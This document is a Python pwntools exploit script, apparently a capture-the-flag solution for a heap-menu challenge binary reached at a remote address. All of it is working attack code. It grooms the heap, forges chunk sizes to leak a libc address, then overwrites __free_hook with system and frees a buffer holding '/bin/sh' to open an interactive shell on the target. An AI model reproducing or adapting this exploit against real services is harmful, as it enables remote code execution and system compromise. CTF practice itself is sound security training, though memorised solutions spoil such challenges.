#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall", 0)
libc = exe.libc

context.binary = exe
GDBCMD = """
  brva 0x930
"""
r = None

def conn():
    if args.LOCAL:
        return process(exe.path)
    else:
        return remote("69.90.132.248", 1337)

def new(idx, size):
    r.sendlineafter("Choice: ", "1")
    r.sendlineafter(": ", str(idx))
    r.sendlineafter(": ", str(size))

def edit(idx, data):
    r.sendlineafter("Choice: ", "2")
    r.sendlineafter(": ", str(idx))
    r.sendafter(": ", data)

def copy(src, dst):
    r.sendlineafter("Choice: ", "3")
    r.sendlineafter(": ", str(src))
    r.sendlineafter(": ", str(dst))

def view(idx):
    r.sendlineafter("Choice: ", "4")
    r.sendlineafter(": ", str(idx))
    r.recvuntil(": ")
    return r.recvline(0)

def delete(idx):
    r.sendlineafter("Choice: ", "5")
    r.sendlineafter(": ", str(idx))

r = conn()
new(0, 0x30)
new(1, 0x10)

for i in range(8):
    size = 0x40 + i*0x10
    new(4, size)
    edit(4, p64(0x21) * (size/8))
    delete(4)

for i in range(2):
    copy(0, 0)
    edit(0, 'x')

new(2, 0x30)

new(3, 0x30)
shell = ';/bin/sh;'
edit(3, shell + 'B'*(0x2f-len(shell))+'\xf1')
delete(1)

new(0, 0xe0)
edit(0, p64(0)*2 + p64(0x421))

new(1, 0x40)
delete(1)

new(1, 0x40)
libc.address = u64(view(1).ljust(8, '\x00')) - 0x1ebfd0
log.success('Libc leak: '+hex(libc.address))

new(2, 0x60)
copy(2, 2)
edit(2, 'x')
delete(2)

new(2, 0xc0)
edit(2, 'B'*0x50 + p64(0x70) + p64(libc.symbols['__free_hook']-8))

new(0, 0x60)
new(1, 0x60)

edit(1, p64(libc.symbols['system']))
edit(2, 'B'*0xc0)

copy(3,3)
r.interactive()
